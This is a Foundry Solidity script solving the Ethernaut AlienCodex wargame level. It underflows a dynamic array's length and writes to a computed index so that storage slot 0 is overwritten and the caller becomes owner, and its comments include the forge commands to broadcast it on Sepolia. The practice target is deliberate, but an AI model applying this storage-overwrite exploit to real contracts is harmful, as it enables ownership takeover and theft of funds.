// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

/*
    Solution script for the Ethernaut Level 9: AlienCodex

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in AlienCodexScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/AlienCodex.s.sol:AlienCodexScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/AlienCodex.s.sol/11155111
*/

interface AlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x3D2AB6Bfb8cFB6265a65d07aF44D10E978008823;
    AlienCodex level19 = AlienCodex(instance);

    function run() external {
        vm.startBroadcast();

        // the actual codex starts at the hash of 1
        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
        // using overflew subtract the codex index from uint256 max + 1
        uint256 index = type(uint256).max - codexZeroIndex + 1;

        // call the required functions on the level contract instance
        level19.makeContact();
        level19.retract();
        // The _content is of type bytes32 which means we need to convert our address to bytes32.
        level19.revise(index, bytes32(uint256(uint160(msg.sender))));

        // if the player is not the owner then we have failed so revert
        require(level19.owner() == msg.sender, "Owner not updated correctly");

        // console.log("owner: ", level19.owner());

        vm.stopBroadcast();
    }
}